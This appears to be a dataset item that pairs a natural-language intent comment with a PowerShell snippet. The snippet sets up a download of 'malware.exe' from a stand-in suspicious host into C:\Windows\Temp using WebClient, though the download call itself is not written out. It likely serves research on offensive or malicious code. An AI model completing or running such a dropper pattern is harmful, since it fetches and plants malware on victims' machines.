# Natural language intent:
# Create a new WebClient object and download a file from a specified URL to a specified output location.

$url = "http://sospiciousurl.org/malware.exe";$output = "C:\Windows\Temp\malware.exe";$client = new-object System.Net.WebClient
